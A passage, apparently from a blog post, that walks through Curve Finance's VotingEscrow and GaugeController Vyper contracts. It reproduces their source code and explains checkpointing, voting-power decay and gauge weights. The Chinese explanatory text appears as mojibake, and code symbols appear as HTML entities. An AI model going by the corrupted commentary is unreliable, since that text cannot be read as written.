MAXTIME, \"Voting lock can be 4 years max\"\n\n    self._deposit_for(msg.sender, 0, unlock_time, _locked, INCREASE_UNLOCK_TIME)\n\n\n@external\n@nonreentrant('lock')\ndef withdraw():\n    \"\"\"\n    @notice Withdraw all tokens for `msg.sender`\n    @dev Only possible if the lock has expired\n    \"\"\"\n    _locked: LockedBalance = self.locked[msg.sender]\n    assert block.timestamp >= _locked.end, \"The lock didn't expire\"\n    value: uint256 = convert(_locked.amount, uint256)\n\n    old_locked: LockedBalance = _locked\n    _locked.end = 0\n    _locked.amount = 0\n    self.locked[msg.sender] = _locked\n    supply_before: uint256 = self.supply\n    self.supply = supply_before - value\n\n    # old_locked can have either expired &lt;= timestamp or zero end\n    # _locked has only 0 end\n    # Both can have >= 0 amount\n    self._checkpoint(msg.sender, old_locked, _locked)\n\n    assert ERC20(self.token).transfer(msg.sender, value)\n\n    log Withdraw(msg.sender, value, block.timestamp)\n    log Supply(supply_before, supply_before - value)\n\n\n# The following ERC20/minime-compatible methods are not real balanceOf and supply!\n# They measure the weights for the purpose of voting, so they don't represent\n# real coins.\n\n@internal\n@view\ndef find_block_epoch(_block: uint256, max_epoch: uint256) -> uint256:\n    \"\"\"\n    @notice Binary search to estimate timestamp for block number\n    @param _block Block to find\n    @param max_epoch Don't go beyond this epoch\n    @return Approximate timestamp for block\n    \"\"\"\n    # Binary search\n    _min: uint256 = 0\n    _max: uint256 = max_epoch\n    for i in range(128):  # Will be always enough for 128-bit numbers\n        if _min >= _max:\n            break\n        _mid: uint256 = (_min + _max + 1) / 2\n        if self.point_history[_mid].blk &lt;= _block:\n            _min = _mid\n        else:\n            _max = _mid - 1\n    return _min\n\n\n@external\n@view\ndef balanceOf(addr: address, _t: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Get the current voting power for `msg.sender`\n    @dev Adheres to the ERC20 `balanceOf` interface for Aragon compatibility\n    @param addr User wallet address\n    @param _t Epoch time to return voting power at\n    @return User voting power\n    \"\"\"\n    _epoch: uint256 = self.user_point_epoch[addr]\n    if _epoch == 0:\n        return 0\n    else:\n        last_point: Point = self.user_point_history[addr][_epoch]\n        last_point.bias -= last_point.slope * convert(_t - last_point.ts, int128)\n        if last_point.bias &lt; 0:\n            last_point.bias = 0\n        return convert(last_point.bias, uint256)\n\n\n@external\n@view\ndef balanceOfAt(addr: address, _block: uint256) -> uint256:\n    \"\"\"\n    @notice Measure voting power of `addr` at block height `_block`\n    @dev Adheres to MiniMe `balanceOfAt` interface: https://github.com/Giveth/minime\n    @param addr User's wallet address\n    @param _block Block to calculate the voting power at\n    @return Voting power\n    \"\"\"\n    # Copying and pasting totalSupply code because Vyper cannot pass by\n    # reference yet\n    assert _block &lt;= block.number\n\n    # Binary search\n    _min: uint256 = 0\n    _max: uint256 = self.user_point_epoch[addr]\n    for i in range(128):  # Will be always enough for 128-bit numbers\n        if _min >= _max:\n            break\n        _mid: uint256 = (_min + _max + 1) / 2\n        if self.user_point_history[addr][_mid].blk &lt;= _block:\n            _min = _mid\n        else:\n            _max = _mid - 1\n\n    upoint: Point = self.user_point_history[addr][_min]\n\n    max_epoch: uint256 = self.epoch\n    _epoch: uint256 = self.find_block_epoch(_block, max_epoch)\n    point_0: Point = self.point_history[_epoch]\n    d_block: uint256 = 0\n    d_t: uint256 = 0\n    if _epoch &lt; max_epoch:\n        point_1: Point = self.point_history[_epoch + 1]\n        d_block = point_1.blk - point_0.blk\n        d_t = point_1.ts - point_0.ts\n    else:\n        d_block = block.number - point_0.blk\n        d_t = block.timestamp - point_0.ts\n    block_time: uint256 = point_0.ts\n    if d_block != 0:\n        block_time += d_t * (_block - point_0.blk) / d_block\n\n    upoint.bias -= upoint.slope * convert(block_time - upoint.ts, int128)\n    if upoint.bias >= 0:\n        return convert(upoint.bias, uint256)\n    else:\n        return 0\n\n\n@internal\n@view\ndef supply_at(point: Point, t: uint256) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power at some point in the past\n    @param point The point (bias/slope) to start search from\n    @param t Time to calculate the total voting power at\n    @return Total voting power at that time\n    \"\"\"\n    last_point: Point = point\n    t_i: uint256 = (last_point.ts / WEEK) * WEEK\n    for i in range(255):\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > t:\n            t_i = t\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_point.ts, int128)\n        if t_i == t:\n            break\n        last_point.slope += d_slope\n        last_point.ts = t_i\n\n    if last_point.bias &lt; 0:\n        last_point.bias = 0\n    return convert(last_point.bias, uint256)\n\n\n@external\n@view\ndef totalSupply(t: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power\n    @dev Adheres to the ERC20 `totalSupply` interface for Aragon compatibility\n    @return Total voting power\n    \"\"\"\n    _epoch: uint256 = self.epoch\n    last_point: Point = self.point_history[_epoch]\n    return self.supply_at(last_point, t)\n\n\n@external\n@view\ndef totalSupplyAt(_block: uint256) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power at some point in the past\n    @param _block Block to calculate the total voting power at\n    @return Total voting power at `_block`\n    \"\"\"\n    assert _block &lt;= block.number\n    _epoch: uint256 = self.epoch\n    target_epoch: uint256 = self.find_block_epoch(_block, _epoch)\n\n    point: Point = self.point_history[target_epoch]\n    dt: uint256 = 0\n    if target_epoch &lt; _epoch:\n        point_next: Point = self.point_history[target_epoch + 1]\n        if point.blk != point_next.blk:\n            dt = (_block - point.blk) * (point_next.ts - point.ts) / (point_next.blk - point.blk)\n    else:\n        if point.blk != block.number:\n            dt = (_block - point.blk) * (block.timestamp - point.ts) / (block.number - point.blk)\n    # Now dt contains info on how far are we beyond point\n\n    return self.supply_at(point, point.ts + dt)\n\n\n# Dummy methods for compatibility with Aragon\n\n@external\ndef changeController(_newController: address):\n    \"\"\"\n    @dev Dummy method required for Aragon compatibility\n    \"\"\"\n    assert msg.sender == self.controller\n    self.controller = _newController\n\n\n\nAnalyzedeposit_forï¼Œcreate_lockï¼Œincrease_amountï¼Œincrease_unlock_timeï¼Œwithdrawå‡½æ•°åˆ†åˆ«æ˜¯å­˜ï¼Œåˆ›å»ºï¼ˆç»“æŸä¸Šä¸€æ¬¡lockå¹¶å–å‡ºtokenï¼‰ï¼Œå¢žåŠ ï¼Œå»¶é•¿ï¼Œå–æ¬¾å‡½æ•°ï¼Œæ ¸å¿ƒå‡½æ•°ä¸ºï¼š\n@internal\ndef _deposit_for(_addr: address, _value: uint256, unlock_time: uint256, locked_balance: LockedBalance, type: int128):\n    \"\"\"\n    @notice Deposit and lock tokens for a user\n    @param _addr User's wallet address\n    @param _value Amount to deposit\n    @param unlock_time New time when to unlock the tokens, or 0 if unchanged\n    @param locked_balance Previous locked amount / timestamp\n    \"\"\"\n    _locked: LockedBalance = locked_balance\n    supply_before: uint256 = self.supply\n\n    self.supply = supply_before + _value\n    old_locked: LockedBalance = _locked\n    # Adding to existing lock, or if a lock is expired - creating a new one\n    _locked.amount += convert(_value, int128)\n    if unlock_time != 0:\n        _locked.end = unlock_time\n    self.locked[_addr] = _locked\n\n    # Possibilities:\n    # Both old_locked.end could be current or expired (>/&lt; block.timestamp)\n    # value == 0 (extend lock) or value > 0 (add to lock or extend lock)\n    # _locked.end > block.timestamp (always)\n    self._checkpoint(_addr, old_locked, _locked)\n\n    if _value != 0:\n        assert ERC20(self.token).transferFrom(_addr, self, _value)\n\n    log Deposit(_addr, _value, _locked.end, type, block.timestamp)\n    log Supply(supply_before, supply_before + _value)\n\næ›´æ–°åˆçº¦çš„supplyä»¥åŠaddrå¯¹åº”çš„locked amountä»¥åŠunlock tomeåŒæ—¶è½¬è´¦å¯¹åº”é‡‘é¢åˆ°åˆçº¦å†…ï¼Œæ¯æ¬¡è¢«è°ƒç”¨éƒ½ä¼šè§¦å‘_checkpointå‡½æ•°ï¼š\ndef _checkpoint(addr: address, old_locked: LockedBalance, new_locked: LockedBalance):\n    \"\"\"\n    @notice Record global and per-user data to checkpoint\n    @param addr User's wallet address. No user checkpoint if 0x0\n    @param old_locked Pevious locked amount / end lock time for the user\n    @param new_locked New locked amount / end lock time for the user\n    \"\"\"\n    u_old: Point = empty(Point)\n    u_new: Point = empty(Point)\n    old_dslope: int128 = 0\n    new_dslope: int128 = 0\n    _epoch: uint256 = self.epoch\n\n    if addr != ZERO_ADDRESS:\n        # Calculate slopes and biases\n        # Kept at zero when they have to\n        if old_locked.end > block.timestamp and old_locked.amount > 0:\n            u_old.slope = old_locked.amount / MAXTIME\n            u_old.bias = u_old.slope * convert(old_locked.end - block.timestamp, int128)\n        if new_locked.end > block.timestamp and new_locked.amount > 0:\n            u_new.slope = new_locked.amount / MAXTIME\n            u_new.bias = u_new.slope * convert(new_locked.end - block.timestamp, int128)\n\n        # Read values of scheduled changes in the slope\n        # old_locked.end can be in the past and in the future\n        # new_locked.end can ONLY by in the FUTURE unless everything expired: than zeros\n        old_dslope = self.slope_changes[old_locked.end]\n        if new_locked.end != 0:\n            if new_locked.end == old_locked.end:\n                new_dslope = old_dslope\n            else:\n                new_dslope = self.slope_changes[new_locked.end]\n\n    last_point: Point = Point(&#123;bias: 0, slope: 0, ts: block.timestamp, blk: block.number&#125;)\n    if _epoch > 0:\n        last_point = self.point_history[_epoch]\n    last_checkpoint: uint256 = last_point.ts\n    # initial_last_point is used for extrapolation to calculate block number\n    # (approximately, for *At methods) and save them\n    # as we cannot figure that out exactly from inside the contract\n    initial_last_point: Point = last_point\n    block_slope: uint256 = 0  # dblock/dt\n    if block.timestamp > last_point.ts:\n        block_slope = MULTIPLIER * (block.number - last_point.blk) / (block.timestamp - last_point.ts)\n    # If last point is already recorded in this block, slope=0\n    # But that's ok b/c we know the block in such case\n\n    # Go over weeks to fill history and calculate what the current point is\n    t_i: uint256 = (last_checkpoint / WEEK) * WEEK\n    for i in range(255):\n        # Hopefully it won't happen that this won't get used in 5 years!\n        # If it does, users will be able to withdraw but vote weight will be broken\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > block.timestamp:\n            t_i = block.timestamp\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_checkpoint, int128)\n        last_point.slope += d_slope\n        if last_point.bias &lt; 0:  # This can happen\n            last_point.bias = 0\n        if last_point.slope &lt; 0:  # This cannot happen - just in case\n            last_point.slope = 0\n        last_checkpoint = t_i\n        last_point.ts = t_i\n        last_point.blk = initial_last_point.blk + block_slope * (t_i - initial_last_point.ts) / MULTIPLIER\n        _epoch += 1\n        if t_i == block.timestamp:\n            last_point.blk = block.number\n            break\n        else:\n            self.point_history[_epoch] = last_point\n\n    self.epoch = _epoch\n    # Now point_history is filled until t=now\n\n    if addr != ZERO_ADDRESS:\n        # If last point was in this block, the slope change has been applied already\n        # But in such case we have 0 slope(s)\n        last_point.slope += (u_new.slope - u_old.slope)\n        last_point.bias += (u_new.bias - u_old.bias)\n        if last_point.slope &lt; 0:\n            last_point.slope = 0\n        if last_point.bias &lt; 0:\n            last_point.bias = 0\n\n    # Record the changed point into history\n    self.point_history[_epoch] = last_point\n\n    if addr != ZERO_ADDRESS:\n        # Schedule the slope changes (slope is going down)\n        # We subtract new_user_slope from [new_locked.end]\n        # and add old_user_slope to [old_locked.end]\n        if old_locked.end > block.timestamp:\n            # old_dslope was &lt;something> - u_old.slope, so we cancel that\n            old_dslope += u_old.slope\n            if new_locked.end == old_locked.end:\n                old_dslope -= u_new.slope  # It was a new deposit, not extension\n            self.slope_changes[old_locked.end] = old_dslope\n\n        if new_locked.end > block.timestamp:\n            if new_locked.end > old_locked.end:\n                new_dslope -= u_new.slope  # old slope disappeared at this point\n                self.slope_changes[new_locked.end] = new_dslope\n            # else: we recorded it already in old_dslope\n\n        # Now handle user history\n        user_epoch: uint256 = self.user_point_epoch[addr] + 1\n\n        self.user_point_epoch[addr] = user_epoch\n        u_new.ts = block.timestamp\n        u_new.blk = block.number\n        self.user_point_history[addr][user_epoch] = u_new\n\n\nè¯¥å‡½æ•°ç”¨äºŽå°†å…¨å±€å’Œæ¯ä¸ªç”¨æˆ·æ•°æ®è®°å½•åˆ°pointæ¯ä¸€æ¬¡é€‰æ‹©è¯­å¥éƒ½æ³¨é‡Šäº†è¿›è¡Œçš„æ“ä½œä»¥åŠç›®çš„ï¼Œé€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦ä»”ç»†åˆ†æž\nfind_block_epochå‡½æ•°ä½¿ç”¨æŠ˜åŠæŸ¥æ‰¾æ£€ç´¢è¿‘ä¼¼blockå¯¹åº”çš„pointï¼Œè¿›è€Œåœ¨balanceAtä»¥åŠtotalsupplyAtå‡½æ•°ä¸­ä¼°è®¡blockå¯¹åº”çš„æ—¶é—´æˆ³\nbalanceOfè®¡ç®—åœ¨æŸä¸€æ—¶é—´ç‚¹æ—¶å€™å¯¹åº”çš„vote weightï¼ŒbalanceOfè®¡ç®—åœ¨å¯¹åº”blockä¸‹çš„vote weight\n\ncase 1\n\n_epoch&lt;max_epoch\n\n\n\ncase 2\n\n_epoch&gt;&#x3D;max_epoch\n\n\n\ntotalsupplyè®¡ç®—åœ¨æŸä¸€æ—¶é—´ç‚¹æ—¶å€™å¯¹åº”çš„total vote weightï¼ŒtotalsupplyAtè®¡ç®—åœ¨å¯¹åº”blockä¸‹çš„total vote weight\nå…¶è¾…åŠ©å‡½æ•°ä¸ºï¼š\ndef find_block_epoch(_block: uint256, max_epoch: uint256) -> uint256:\n    \"\"\"\n    @notice Binary search to estimate timestamp for block number\n    @param _block Block to find\n    @param max_epoch Don't go beyond this epoch\n    @return Approximate timestamp for block\n    \"\"\"\n    # Binary search\n    _min: uint256 = 0\n    _max: uint256 = max_epoch\n    for i in range(128):  # Will be always enough for 128-bit numbers\n        if _min >= _max:\n            break\n        _mid: uint256 = (_min + _max + 1) / 2\n        if self.point_history[_mid].blk &lt;= _block:\n            _min = _mid\n        else:\n            _max = _mid - 1\n    return _min\n\ncase 1\n\ntarget_epoch &lt; _epoch\n\n\n\ncase 2\n\ntarget_epoch &gt;&#x3D; _epoch\n\n\n\nå…¶æ ¸å¿ƒå‡½æ•°ä¸ºï¼š\ndef supply_at(point: Point, t: uint256) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power at some point in the past\n    @param point The point (bias/slope) to start search from\n    @param t Time to calculate the total voting power at\n    @return Total voting power at that time\n    \"\"\"\n    last_point: Point = point\n    t_i: uint256 = (last_point.ts / WEEK) * WEEK\n    for i in range(255):\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > t:\n            t_i = t\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_point.ts, int128)\n        if t_i == t:\n            break\n        last_point.slope += d_slope\n        last_point.ts = t_i\n\n    if last_point.bias &lt; 0:\n        last_point.bias = 0\n    return convert(last_point.bias, uint256)\n\nå–æœ€è¿‘ä¸€æ¬¡pointï¼Œå¯¹åº”tså››èˆäº”å…¥ä¸ºå‘¨ï¼ŒéåŽ†æ‰€æœ‰WEEKï¼Œä»¥æœ€æ–°ä¸€æ¬¡çš„biasç´¯åŠ è®¡ç®—\nGauge ControllerCode\nClick to see more\n# @version 0.2.4\n\n\"\"\"\n@title Gauge Controller\n@author Curve Finance\n@license MIT\n@notice Controls liquidity gauges and the issuance of coins through the gauges\n\"\"\"\n\n# 7 * 86400 seconds - all future times are rounded by week\nWEEK: constant(uint256) = 604800\n\n# Cannot change weight votes more often than once in 10 days\nWEIGHT_VOTE_DELAY: constant(uint256) = 10 * 86400\n\n\nstruct Point:\n    bias: uint256\n    slope: uint256\n\nstruct VotedSlope:\n    slope: uint256\n    power: uint256\n    end: uint256\n\n\ninterface VotingEscrow:\n    def get_last_user_slope(addr: address) -> int128: view\n    def locked__end(addr: address) -> uint256: view\n\n\nevent CommitOwnership:\n    admin: address\n\nevent ApplyOwnership:\n    admin: address\n\nevent AddType:\n    name: String[64]\n    type_id: int128\n\nevent NewTypeWeight:\n    type_id: int128\n    time: uint256\n    weight: uint256\n    total_weight: uint256\n\nevent NewGaugeWeight:\n    gauge_address: address\n    time: uint256\n    weight: uint256\n    total_weight: uint256\n\nevent VoteForGauge:\n    time: uint256\n    user: address\n    gauge_addr: address\n    weight: uint256\n\nevent NewGauge:\n    addr: address\n    gauge_type: int128\n    weight: uint256\n\n\nMULTIPLIER: constant(uint256) = 10 ** 18\n\nadmin: public(address)  # Can and will be a smart contract\nfuture_admin: public(address)  # Can and will be a smart contract\n\ntoken: public(address)  # CRV token\nvoting_escrow: public(address)  # Voting escrow\n\n# Gauge parameters\n# All numbers are \"fixed point\" on the basis of 1e18\nn_gauge_types: public(int128)\nn_gauges: public(int128)\ngauge_type_names: public(HashMap[int128, String[64]])\n\n# Needed for enumeration\ngauges: public(address[1000000000])\n\n# we increment values by 1 prior to storing them here so we can rely on a value\n# of zero as meaning the gauge has not been set\ngauge_types_: HashMap[address, int128]\n\nvote_user_slopes: public(HashMap[address, HashMap[address, VotedSlope]])  # user -> gauge_addr -> VotedSlope\nvote_user_power: public(HashMap[address, uint256])  # Total vote power used by user\nlast_user_vote: public(HashMap[address, HashMap[address, uint256]])  # Last user vote's timestamp for each gauge address\n\n# Past and scheduled points for gauge weight, sum of weights per type, total weight\n# Point is for bias+slope\n# changes_* are for changes in slope\n# time_* are for the last change timestamp\n# timestamps are rounded to whole weeks\n\npoints_weight: public(HashMap[address, HashMap[uint256, Point]])  # gauge_addr -> time -> Point\nchanges_weight: HashMap[address, HashMap[uint256, uint256]]  # gauge_addr -> time -> slope\ntime_weight: public(HashMap[address, uint256])  # gauge_addr -> last scheduled time (next week)\n\npoints_sum: public(HashMap[int128, HashMap[uint256, Point]])  # type_id -> time -> Point\nchanges_sum: HashMap[int128, HashMap[uint256, uint256]]  # type_id -> time -> slope\ntime_sum: public(uint256[1000000000])  # type_id -> last scheduled time (next week)\n\npoints_total: public(HashMap[uint256, uint256])  # time -> total weight\ntime_total: public(uint256)  # last scheduled time\n\npoints_type_weight: public(HashMap[int128, HashMap[uint256, uint256]])  # type_id -> time -> type weight\ntime_type_weight: public(uint256[1000000000])  # type_id -> last scheduled time (next week)\n\n\n@external\ndef __init__(_token: address, _voting_escrow: address):\n    \"\"\"\n    @notice Contract constructor\n    @param _token `ERC20CRV` contract address\n    @param _voting_escrow `VotingEscrow` contract address\n    \"\"\"\n    assert _token != ZERO_ADDRESS\n    assert _voting_escrow != ZERO_ADDRESS\n\n    self.admin = msg.sender\n    self.token = _token\n    self.voting_escrow = _voting_escrow\n    self.time_total = block.timestamp / WEEK * WEEK\n\n\n@external\ndef commit_transfer_ownership(addr: address):\n    \"\"\"\n    @notice Transfer ownership of GaugeController to `addr`\n    @param addr Address to have ownership transferred to\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    self.future_admin = addr\n    log CommitOwnership(addr)\n\n\n@external\ndef apply_transfer_ownership():\n    \"\"\"\n    @notice Apply pending ownership transfer\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    _admin: address = self.future_admin\n    assert _admin != ZERO_ADDRESS  # dev: admin not set\n    self.admin = _admin\n    log ApplyOwnership(_admin)\n\n\n@external\n@view\ndef gauge_types(_addr: address) -> int128:\n    \"\"\"\n    @notice Get gauge type for address\n    @param _addr Gauge address\n    @return Gauge type id\n    \"\"\"\n    gauge_type: int128 = self.gauge_types_[_addr]\n    assert gauge_type != 0\n\n    return gauge_type - 1\n\n\n@internal\ndef _get_type_weight(gauge_type: int128) -> uint256:\n    \"\"\"\n    @notice Fill historic type weights week-over-week for missed checkins\n            and return the type weight for the future week\n    @param gauge_type Gauge type id\n    @return Type weight\n    \"\"\"\n    t: uint256 = self.time_type_weight[gauge_type]\n    if t > 0:\n        w: uint256 = self.points_type_weight[gauge_type][t]\n        for i in range(500):\n            if t > block.timestamp:\n                break\n            t += WEEK\n            self.points_type_weight[gauge_type][t] = w\n            if t > block.timestamp:\n                self.time_type_weight[gauge_type] = t\n        return w\n    else:\n        return 0\n\n\n@internal\ndef _get_sum(gauge_type: int128) -> uint256:\n    \"\"\"\n    @notice Fill sum of gauge weights for the same type week-over-week for\n            missed checkins and return the sum for the future week\n    @param gauge_type Gauge type id\n    @return Sum of weights\n    \"\"\"\n    t: uint256 = self.time_sum[gauge_type]\n    if t > 0:\n        pt: Point = self.points_sum[gauge_type][t]\n        for i in range(500):\n            if t > block.timestamp:\n                break\n            t += WEEK\n            d_bias: uint256 = pt.slope * WEEK\n            if pt.bias > d_bias:\n                pt.bias -= d_bias\n                d_slope: uint256 = self.changes_sum[gauge_type][t]\n                pt.slope -= d_slope\n            else:\n                pt.bias = 0\n                pt.slope = 0\n            self.points_sum[gauge_type][t] = pt\n            if t > block.timestamp:\n                self.time_sum[gauge_type] = t\n        return pt.bias\n    else:\n        return 0\n\n\n@internal\ndef _get_total() -> uint256:\n    \"\"\"\n    @notice Fill historic total weights week-over-week for missed checkins\n            and return the total for the future week\n    @return Total weight\n    \"\"\"\n    t: uint256 = self.time_total\n    _n_gauge_types: int128 = self.n_gauge_types\n    if t > block.timestamp:\n        # If we have already checkpointed - still need to change the value\n        t -= WEEK\n    pt: uint256 = self.points_total[t]\n\n    for gauge_type in range(100):\n        if gauge_type == _n_gauge_types:\n            break\n        self._get_sum(gauge_type)\n        self._get_type_weight(gauge_type)\n\n    for i in range(500):\n        if t > block.timestamp:\n            break\n        t += WEEK\n        pt = 0\n        # Scales as n_types * n_unchecked_weeks (hopefully 1 at most)\n        for gauge_type in range(100):\n            if gauge_type == _n_gauge_types:\n                break\n            type_sum: uint256 = self.points_sum[gauge_type][t].bias\n            type_weight: uint256 = self.points_type_weight[gauge_type][t]\n            pt += type_sum * type_weight\n        self.points_total[t] = pt\n\n        if t > block.timestamp:\n            self.time_total = t\n    return pt\n\n\n@internal\ndef _get_weight(gauge_addr: address) -> uint256:\n    \"\"\"\n    @notice Fill historic gauge weights week-over-week for missed checkins\n            and return the total for the future week\n    @param gauge_addr Address of the gauge\n    @return Gauge weight\n    \"\"\"\n    t: uint256 = self.time_weight[gauge_addr]\n    if t > 0:\n        pt: Point = self.points_weight[gauge_addr][t]\n        for i in range(500):\n            if t > block.timestamp:\n                break\n            t += WEEK\n            d_bias: uint256 = pt.slope * WEEK\n            if pt.bias > d_bias:\n                pt.bias -= d_bias\n                d_slope: uint256 = self.changes_weight[gauge_addr][t]\n                pt.slope -= d_slope\n            else:\n                pt.bias = 0\n                pt.slope = 0\n            self.points_weight[gauge_addr][t] = pt\n            if t > block.timestamp:\n                self.time_weight[gauge_addr] = t\n        return pt.bias\n    else:\n        return 0\n\n\n@external\ndef add_gauge(addr: address, gauge_type: int128, weight: uint256 = 0):\n    \"\"\"\n    @notice Add gauge `addr` of type `gauge_type` with weight `weight`\n    @param addr Gauge address\n    @param gauge_type Gauge type\n    @param weight Gauge weight\n    \"\"\"\n    assert msg.sender == self.admin\n    assert (gauge_type >= 0) and (gauge_type &lt; self.n_gauge_types)\n    assert self.gauge_types_[addr] == 0  # dev: cannot add the same gauge twice\n\n    n: int128 = self.n_gauges\n    self.n_gauges = n + 1\n    self.gauges[n] = addr\n\n    self.gauge_types_[addr] = gauge_type + 1\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    if weight > 0:\n        _type_weight: uint256 = self._get_type_weight(gauge_type)\n        _old_sum: uint256 = self._get_sum(gauge_type)\n        _old_total: uint256 = self._get_total()\n\n        self.points_sum[gauge_type][next_time].bias = weight + _old_sum\n        self.time_sum[gauge_type] = next_time\n        self.points_total[next_time] = _old_total + _type_weight * weight\n        self.time_total = next_time\n\n        self.points_weight[addr][next_time].bias = weight\n\n    if self.time_sum[gauge_type] == 0:\n        self.time_sum[gauge_type] = next_time\n    self.time_weight[addr] = next_time\n\n    log NewGauge(addr, gauge_type, weight)\n\n\n@external\ndef checkpoint():\n    \"\"\"\n    @notice Checkpoint to fill data common for all gauges\n    \"\"\"\n    self._get_total()\n\n\n@external\ndef checkpoint_gauge(addr: address):\n    \"\"\"\n    @notice Checkpoint to fill data for both a specific gauge and common for all gauges\n    @param addr Gauge address\n    \"\"\"\n    self._get_weight(addr)\n    self._get_total()\n\n\n@internal\n@view\ndef _gauge_relative_weight(addr: address, time: uint256) -> uint256:\n    \"\"\"\n    @notice Get Gauge relative weight (not more than 1.0) normalized to 1e18\n            (e.g. 1.0 == 1e18). Inflation which will be received by it is\n            inflation_rate * relative_weight / 1e18\n    @param addr Gauge address\n    @param time Relative weight at the specified timestamp in the past or present\n    @return Value of relative weight normalized to 1e18\n    \"\"\"\n    t: uint256 = time / WEEK * WEEK\n    _total_weight: uint256 = self.points_total[t]\n\n    if _total_weight > 0:\n        gauge_type: int128 = self.gauge_types_[addr] - 1\n        _type_weight: uint256 = self.points_type_weight[gauge_type][t]\n        _gauge_weight: uint256 = self.points_weight[addr][t].bias\n        return MULTIPLIER * _type_weight * _gauge_weight / _total_weight\n\n    else:\n        return 0\n\n\n@external\n@view\ndef gauge_relative_weight(addr: address, time: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Get Gauge relative weight (not more than 1.0) normalized to 1e18\n            (e.g. 1.0 == 1e18). Inflation which will be received by it is\n            inflation_rate * relative_weight / 1e18\n    @param addr Gauge address\n    @param time Relative weight at the specified timestamp in the past or present\n    @return Value of relative weight normalized to 1e18\n    \"\"\"\n    return self._gauge_relative_weight(addr, time)\n\n\n@external\ndef gauge_relative_weight_write(addr: address, time: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Get gauge weight normalized to 1e18 and also fill all the unfilled\n            values for type and gauge records\n    @dev Any address can call, however nothing is recorded if the values are filled already\n    @param addr Gauge address\n    @param time Relative weight at the specified timestamp in the past or present\n    @return Value of relative weight normalized to 1e18\n    \"\"\"\n    self._get_weight(addr)\n    self._get_total()  # Also calculates get_sum\n    return self._gauge_relative_weight(addr, time)\n\n\n\n\n@internal\ndef _change_type_weight(type_id: int128, weight: uint256):\n    \"\"\"\n    @notice Change type weight\n    @param type_id Type id\n    @param weight New type weight\n    \"\"\"\n    old_weight: uint256 = self._get_type_weight(type_id)\n    old_sum: uint256 = self._get_sum(type_id)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    _total_weight = _total_weight + old_sum * weight - old_sum * old_weight\n    self.points_total[next_time] = _total_weight\n    self.points_type_weight[type_id][next_time] = weight\n    self.time_total = next_time\n    self.time_type_weight[type_id] = next_time\n\n    log NewTypeWeight(type_id, next_time, weight, _total_weight)\n\n\n@external\ndef add_type(_name: String[64], weight: uint256 = 0):\n    \"\"\"\n    @notice Add gauge type with name `_name` and weight `weight`\n    @param _name Name of gauge type\n    @param weight Weight of gauge type\n    \"\"\"\n    assert msg.sender == self.admin\n    type_id: int128 = self.n_gauge_types\n    self.gauge_type_names[type_id] = _name\n    self.n_gauge_types = type_id + 1\n    if weight != 0:\n        self._change_type_weight(type_id, weight)\n        log AddType(_name, type_id)\n\n\n@external\ndef change_type_weight(type_id: int128, weight: uint256):\n    \"\"\"\n    @notice Change gauge type `type_id` weight to `weight`\n    @param type_id Gauge type id\n    @param weight New Gauge weight\n    \"\"\"\n    assert msg.sender == self.admin\n    self._change_type_weight(type_id, weight)\n\n\n@internal\ndef _change_gauge_weight(addr: address, weight: uint256):\n    # Change gauge weight\n    # Only needed when testing in reality\n    gauge_type: int128 = self.gauge_types_[addr] - 1\n    old_gauge_weight: uint256 = self._get_weight(addr)\n    type_weight: uint256 = self._get_type_weight(gauge_type)\n    old_sum: uint256 = self._get_sum(gauge_type)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    self.points_weight[addr][next_time].bias = weight\n    self.time_weight[addr] = next_time\n\n    new_sum: uint256 = old_sum + weight - old_gauge_weight\n    self.points_sum[gauge_type][next_time].bias = new_sum\n    self.time_sum[gauge_type] = next_time\n\n    _total_weight = _total_weight + new_sum * type_weight - old_sum * type_weight\n    self.points_total[next_time] = _total_weight\n    self.time_total = next_time\n\n    log NewGaugeWeight(addr, block.timestamp, weight, _total_weight)\n\n\n@external\ndef change_gauge_weight(addr: address, weight: uint256):\n    \"\"\"\n    @notice Change weight of gauge `addr` to `weight`\n    @param addr `GaugeController` contract address\n    @param weight New Gauge weight\n    \"\"\"\n    assert msg.sender == self.admin\n    self._change_gauge_weight(addr, weight)\n\n\n@external\ndef vote_for_gauge_weights(_gauge_addr: address, _user_weight: uint256):\n    \"\"\"\n    @notice Allocate voting power for changing pool weights\n    @param _gauge_addr Gauge which `msg.sender` votes for\n    @param _user_weight Weight for a gauge in bps (units of 0.01%). Minimal is 0.01%. Ignored if 0\n    \"\"\"\n    escrow: address = self.voting_escrow\n    slope: uint256 = convert(VotingEscrow(escrow).get_last_user_slope(msg.sender), uint256)\n    lock_end: uint256 = VotingEscrow(escrow).locked__end(msg.sender)\n    _n_gauges: int128 = self.n_gauges\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n    assert lock_end > next_time, \"Your token lock expires too soon\"\n    assert (_user_weight >= 0) and (_user_weight &lt;= 10000), \"You used all your voting power\"\n    assert block.timestamp >= self.last_user_vote[msg.sender][_gauge_addr] + WEIGHT_VOTE_DELAY, \"Cannot vote so often\"\n\n    gauge_type: int128 = self.gauge_types_[_gauge_addr] - 1\n    assert gauge_type >= 0, \"Gauge not added\"\n    # Prepare slopes and biases in memory\n    old_slope: VotedSlope = self.vote_user_slopes[msg.sender][_gauge_addr]\n    old_dt: uint256 = 0\n    if old_slope.end > next_time:\n        old_dt = old_slope.end - next_time\n    old_bias: uint256 